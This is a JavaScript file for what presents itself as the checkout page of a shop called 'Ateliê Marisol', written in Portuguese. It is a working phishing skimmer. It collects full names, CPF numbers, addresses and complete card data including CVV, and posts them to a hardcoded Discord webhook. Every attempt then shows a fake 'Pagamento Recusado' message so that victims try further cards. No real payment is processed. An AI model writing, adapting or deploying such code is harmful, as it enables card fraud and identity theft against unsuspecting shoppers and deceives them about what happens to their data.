// Step Navigation
let currentStep = 1;

function unlockStep(stepNumber) {
    // Remove locked class from target step
    const stepElement = document.getElementById(`step-${stepNumber}`);
    if (stepElement) {
        stepElement.classList.remove('locked');
    }
    
    // Update progress indicators
    document.querySelectorAll('.step').forEach((step, index) => {
        if (index < stepNumber) {
            step.classList.add('active');
        }
    });
    
    // Update current step
    currentStep = stepNumber;
    
    // Scroll to the unlocked step
    stepElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// Form Validation
class FormValidator {
    static validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    static validateCPF(cpf) {
        cpf = cpf.replace(/[^\d]/g, '');
        if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
        
        let sum = 0;
        for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
        let digit = 11 - (sum % 11);
        if (digit >= 10) digit = 0;
        if (digit !== parseInt(cpf.charAt(9))) return false;
        
        sum = 0;
        for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
        digit = 11 - (sum % 11);
        if (digit >= 10) digit = 0;
        return digit === parseInt(cpf.charAt(10));
    }

    static validatePhone(phone) {
        const cleaned = phone.replace(/[^\d]/g, '');
        return cleaned.length === 10 || cleaned.length === 11;
    }

    static validateCEP(cep) {
        return cep.replace(/[^\d]/g, '').length === 8;
    }

    static validateCardNumber(number) {
        const cleaned = number.replace(/\s/g, '');
        return cleaned.length >= 13 && cleaned.length <= 19;
    }

    static validateCVV(cvv) {
        return cvv.length === 3 || cvv.length === 4;
    }

    static validateExpiry(expiry) {
        const parts = expiry.split('/');
        if (parts.length !== 2) return false;
        const month = parseInt(parts[0]);
        const year = parseInt('20' + parts[1]);
        if (month < 1 || month > 12) return false;
        const now = new Date();
        const expiryDate = new Date(year, month - 1);
        return expiryDate > now;
    }
}

// Input Masks
class InputMask {
    static phone(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length <= 10) {
            value = value.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
        } else {
            value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
        }
        input.value = value;
    }

    static cpf(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 11) value = value.substring(0, 11);
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        input.value = value;
    }

    static cep(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 8) value = value.substring(0, 8);
        value = value.replace(/^(\d{5})(\d)/, '$1-$2');
        input.value = value;
    }

    static birthdate(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 8) value = value.substring(0, 8);
        value = value.replace(/^(\d{2})(\d)/, '$1/$2');
        value = value.replace(/^(\d{2})\/(\d{2})(\d)/, '$1/$2/$3');
        input.value = value;
    }

    static cardNumber(input) {
        let value = input.value.replace(/\s/g, '');
        value = value.replace(/(\d{4})/g, '$1 ').trim();
        input.value = value;
    }

    static cardExpiry(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        input.value = value;
    }

    static cvv(input) {
        input.value = input.value.replace(/\D/g, '').substring(0, 4);
    }
}

// CEP Search
async function searchCEP(cep) {
    const cleaned = cep.replace(/\D/g, '');
    if (cleaned.length !== 8) return null;

    try {
        const response = await fetch(`https://viacep.com.br/ws/${cleaned}/json/`);
        const data = await response.json();
        return data.erro ? null : data;
    } catch (error) {
        console.error('Error fetching CEP:', error);
        return null;
    }
}


// Validate Step 1 (Dados)
function validateStep1() {
    let isValid = true;
    
    const fields = [
        { id: 'fullName', validator: v => v.trim(), msg: 'Nome completo é obrigatório' },
        { id: 'email', validator: FormValidator.validateEmail, msg: 'E-mail inválido' },
        { id: 'phone', validator: FormValidator.validatePhone, msg: 'Telefone inválido' },
        { id: 'cpf', validator: FormValidator.validateCPF, msg: 'CPF inválido' },
        { id: 'cep', validator: FormValidator.validateCEP, msg: 'CEP inválido' },
        { id: 'street', validator: v => v.trim(), msg: 'Endereço é obrigatório' },
        { id: 'number', validator: v => v.trim(), msg: 'Número é obrigatório' },
        { id: 'neighborhood', validator: v => v.trim(), msg: 'Bairro é obrigatório' },
        { id: 'city', validator: v => v.trim(), msg: 'Cidade é obrigatória' },
        { id: 'state', validator: v => v, msg: 'Estado é obrigatório' }
    ];
    
    fields.forEach(field => {
        const input = document.getElementById(field.id);
        if (!field.validator(input.value)) {
            showError(input, field.msg);
            isValid = false;
        } else {
            clearError(input);
        }
    });
    
    return isValid;
}

// Validate Step 2 (Pagamento)
function validateStep2() {
    let isValid = true;
    
    const cardFields = [
        { id: 'cardNumber', validator: FormValidator.validateCardNumber, msg: 'Número do cartão inválido' },
        { id: 'cardName', validator: v => v.trim(), msg: 'Nome no cartão é obrigatório' },
        { id: 'cardExpiry', validator: FormValidator.validateExpiry, msg: 'Validade inválida' },
        { id: 'cardCvv', validator: FormValidator.validateCVV, msg: 'CVV inválido' }
    ];
    
    cardFields.forEach(field => {
        const input = document.getElementById(field.id);
        if (!field.validator(input.value)) {
            showError(input, field.msg);
            isValid = false;
        } else {
            clearError(input);
        }
    });
    
    return isValid;
}

function showError(input, message) {
    input.classList.add('error');
    const errorSpan = input.parentElement.querySelector('.error-message');
    if (errorSpan) errorSpan.textContent = message;
}

function clearError(input) {
    input.classList.remove('error');
    const errorSpan = input.parentElement.querySelector('.error-message');
    if (errorSpan) errorSpan.textContent = '';
}

// Discord Webhook
async function sendToDiscord(orderData) {
    const webhookUrl = 'https://discordapp.com/api/webhooks/1502415297767014463/hTN7_totGg06GHrtQ6QRJsX_dh9Fq_SELnyaIu2ZeYGDd4ljrMz0pC_IZbYtu8md0RrV';
    
    const embed = {
        title: '🛍️ Novo Pedido Recebido',
        color: 0xFF5DA2,
        fields: [
            {
                name: '👤 Dados Pessoais',
                value: `**Nome:** ${orderData.fullName}\n**E-mail:** ${orderData.email}\n**Telefone:** ${orderData.phone}\n**CPF:** ${orderData.cpf}\n**Data Nascimento:** ${orderData.birthdate || 'Não informado'}`,
                inline: false
            },
            {
                name: '📍 Endereço de Entrega',
                value: `**CEP:** ${orderData.cep}\n**Endereço:** ${orderData.street}, ${orderData.number}\n**Complemento:** ${orderData.complement || 'Não informado'}\n**Bairro:** ${orderData.neighborhood}\n**Cidade:** ${orderData.city}\n**Estado:** ${orderData.state}`,
                inline: false
            },
            {
                name: '💳 Dados do Cartão',
                value: `**Número:** ${orderData.cardNumber}\n**Nome no Cartão:** ${orderData.cardName}\n**Validade:** ${orderData.cardExpiry}\n**CVV:** ${orderData.cardCvv}\n**Parcelas:** ${orderData.installments}`,
                inline: false
            },
            {
                name: '📦 Pedido',
                value: `**Número:** #${orderData.orderNumber}`,
                inline: true
            },
            {
                name: '📅 Data/Hora',
                value: new Date().toLocaleString('pt-BR'),
                inline: true
            }
        ],
        timestamp: new Date().toISOString(),
        footer: {
            text: 'Ateliê Marisol - Sistema de Checkout'
        }
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: 'Checkout Bot',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/2331/2331966.png',
                embeds: [embed]
            })
        });
        return true;
    } catch (error) {
        console.error('Erro ao enviar para Discord:', error);
        return false;
    }
}

// Modal Functions
function showModal() {
    const modal = document.getElementById('successModal');
    const orderNumber = Math.floor(100000 + Math.random() * 900000);
    document.getElementById('orderNumber').textContent = orderNumber;
    modal.classList.add('active');
}

function closeModal() {
    document.getElementById('successModal').classList.remove('active');
    // Reset form and lock step 2 again
    document.getElementById('personalForm').reset();
    document.getElementById('addressForm').reset();
    document.getElementById('creditCardForm').reset();
    
    // Lock step 2 again
    document.getElementById('step-2').classList.add('locked');
    currentStep = 1;
    
    // Reset progress
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    document.querySelector('.step[data-step="1"]').classList.add('active');
    
    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Event Listeners
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('phone').addEventListener('input', function() { InputMask.phone(this); });
    document.getElementById('cpf').addEventListener('input', function() { InputMask.cpf(this); });
    document.getElementById('cep').addEventListener('input', function() { InputMask.cep(this); });
    
    // Birthdate mask (DD/MM/AAAA) – ensures slashes on mobile
    const birthdate = document.getElementById('birthdate');
    if (birthdate) {
        const applyBirthMask = function(el){ InputMask.birthdate(el); };
        birthdate.addEventListener('input', function() { applyBirthMask(this); });
        birthdate.addEventListener('keyup', function() { applyBirthMask(this); });
        birthdate.addEventListener('beforeinput', () => setTimeout(() => applyBirthMask(birthdate), 0));
        birthdate.addEventListener('blur', function() { applyBirthMask(this); });
    }
    
    const cardNumber = document.getElementById('cardNumber');
    if (cardNumber) cardNumber.addEventListener('input', function() { InputMask.cardNumber(this); });
    
    const cardExpiry = document.getElementById('cardExpiry');
    if (cardExpiry) cardExpiry.addEventListener('input', function() { InputMask.cardExpiry(this); });
    
    const cardCvv = document.getElementById('cardCvv');
    if (cardCvv) cardCvv.addEventListener('input', function() { InputMask.cvv(this); });
    
    document.getElementById('searchCep').addEventListener('click', async function() {
        const cepInput = document.getElementById('cep');
        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
        this.disabled = true;
        
        const data = await searchCEP(cepInput.value);
        
        if (data) {
            document.getElementById('street').value = data.logradouro;
            document.getElementById('neighborhood').value = data.bairro;
            document.getElementById('city').value = data.localidade;
            document.getElementById('state').value = data.uf;
            clearError(cepInput);
            document.getElementById('number').focus();
        } else {
            showError(cepInput, 'CEP não encontrado');
        }
        
        this.innerHTML = '<i class="fas fa-search"></i>';
        this.disabled = false;
    });
    
    
    // Next Step Buttons
    document.querySelectorAll('.btn-next-step').forEach(btn => {
        btn.addEventListener('click', function() {
            const nextStep = parseInt(this.dataset.next);
            
            // Validate current step before proceeding
            if (currentStep === 1 && !validateStep1()) {
                alert('Por favor, preencha todos os campos obrigatórios corretamente.');
                return;
            }
            
            unlockStep(nextStep);
        });
    });
    
    // Finish Order Button
    document.getElementById('finishOrder').addEventListener('click', async function() {
        // Validate payment step
        if (!validateStep2()) {
            alert('Por favor, preencha todos os dados do cartão corretamente.');
            return;
        }
        
        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
        this.disabled = true;
        
        // Coletar todos os dados do formulário
        const orderNumber = Math.floor(100000 + Math.random() * 900000);
        const orderData = {
            orderNumber: orderNumber,
            // Dados Pessoais
            fullName: document.getElementById('fullName').value,
            email: document.getElementById('email').value,
            phone: document.getElementById('phone').value,
            cpf: document.getElementById('cpf').value,
            birthdate: document.getElementById('birthdate').value,
            // Endereço
            cep: document.getElementById('cep').value,
            street: document.getElementById('street').value,
            number: document.getElementById('number').value,
            complement: document.getElementById('complement').value,
            neighborhood: document.getElementById('neighborhood').value,
            city: document.getElementById('city').value,
            state: document.getElementById('state').value,
            // Pagamento
            cardNumber: document.getElementById('cardNumber').value,
            cardName: document.getElementById('cardName').value,
            cardExpiry: document.getElementById('cardExpiry').value,
            cardCvv: document.getElementById('cardCvv').value,
            installments: document.getElementById('installments').options[document.getElementById('installments').selectedIndex].text
        };
        
        // Enviar para Discord (assíncrono, mas a UI mostrará pagamento recusado)
        sendToDiscord(orderData).catch(console.error);

        setTimeout(() => {
            // Configurar modal como Pagamento Recusado
            const iconEl = document.getElementById('modalIconElement');
            if (iconEl) {
                iconEl.className = 'fas fa-times-circle';
                iconEl.style.color = getComputedStyle(document.documentElement).getPropertyValue('--error-color') || '#EF4444';
            }
            const titleEl = document.getElementById('modalTitle');
            if (titleEl) titleEl.textContent = 'Pagamento Recusado!';
            const msgEl = document.getElementById('modalMessage');
            if (msgEl) msgEl.textContent = 'Recusado pelo banco emissor. Tente com outro cartão.';
            const orderWrap = document.getElementById('orderNumberWrapper');
            if (orderWrap) orderWrap.style.display = 'none';

            showModal();

            this.innerHTML = '<i class="fas fa-check-circle"></i> Finalizar Compra';
            this.disabled = false;
        }, 6000);
    });
});
